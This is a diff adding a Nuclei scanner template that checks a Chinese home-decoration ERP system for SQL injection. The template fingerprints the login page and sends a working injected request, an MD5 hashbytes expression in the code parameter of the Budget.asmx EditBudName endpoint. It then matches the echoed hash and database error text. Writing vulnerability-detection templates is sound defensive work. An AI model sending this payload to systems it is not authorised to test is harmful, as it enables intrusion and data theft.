@@ -1,0 +1,48 @@
+id: poc-yaml-znfit-erp-ms-editbudname-sqli
+info:
+  name: "家装ERP管理系统 EditBudName SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the EditBudName endpoint of the 家装ERP管理系统.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /main/login.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "上海装盟信息科技有限公司"
+        part: body
+
+  - raw:
+      - |
+        GET /WEB_SERVICE/Budget.asmx/EditBudName?code=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))&name=string HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+        part: body
